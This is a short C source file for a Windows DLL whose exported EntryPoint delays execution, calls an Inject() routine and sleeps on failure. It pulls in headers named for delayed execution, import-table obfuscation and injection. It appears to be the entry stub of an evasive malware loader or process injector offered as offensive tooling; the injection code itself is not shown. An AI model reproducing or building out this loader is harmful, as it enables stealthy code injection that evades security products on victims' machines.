#include <Windows.h>
#include "DelayExec.h"
#include "ObfuscateIAT.h"
#include "Inject.h"

extern __declspec(dllexport) int EntryPoint() 
{
    Wait(TRUE);

    if (Inject() == NULL)
    {
        SharedUserDataSleep(5000);
        return 0;
    }

}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

